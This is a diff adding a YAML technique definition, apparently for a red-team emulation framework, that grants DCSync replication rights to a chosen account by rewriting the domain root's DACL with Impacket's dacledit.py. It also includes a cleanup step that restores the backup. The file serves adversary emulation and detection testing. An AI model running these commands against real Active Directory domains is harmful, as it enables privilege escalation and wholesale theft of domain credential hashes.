@@ -1,0 +1,60 @@
+---
+api_version: 2.0
+uuid: f5a2c9e8-1d7b-4b3a-9e6f-0c8d3a5b7e1f
+name: Grant DCSync Privileges via DACL Modification
+authors:
+  - isaac_fletcher
+description: |
+  Grants DCSync replication privileges (DS-Replication-Get-Changes and
+  DS-Replication-Get-Changes-All) to a target principal by modifying the DACL
+  on the domain root object. Uses Impacket's dacledit.py with the -rights DCSync flag.
+  A backup of the original DACL is saved to a user-specified directory (default: /tmp),
+  and cleanup restores the DACL from that backup.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0003 Persistence
+    - TA0004 Privilege Escalation
+  techniques:
+    - T1098 Account Manipulation
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: target_principal
+    description: The sAMAccountName of the principal to grant DCSync privileges to
+  - name: backup_path
+    description: Path to store the DACL backup file created by dacledit
+    default: /tmp/dacledit.bak
+steps:
+  - name: setup_impacket
+    description: Install impacket
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "impacket"
+
+  - name: grant_dcsync
+    description: Grant DCSync replication privileges to the target principal
+    inline: |
+      dacledit.py -target-dn 'DC={{.Args.domain | replace "." ",DC="}}' \
+        -principal '{{.Args.target_principal}}' -action write -rights DCSync \
+        -file '{{.Args.backup_path}}' \
+        -dc-ip '{{.Args.dc}}' \
+        '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}'
+    cleanup:
+      inline: |
+        dacledit.py -target-dn 'DC={{.Args.domain | replace "." ",DC="}}' \
+          -action restore -file '{{.Args.backup_path}}' \
+          -dc-ip '{{.Args.dc}}' \
+          '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}'
+        rm -f '{{.Args.backup_path}}' dacledit-*.bak
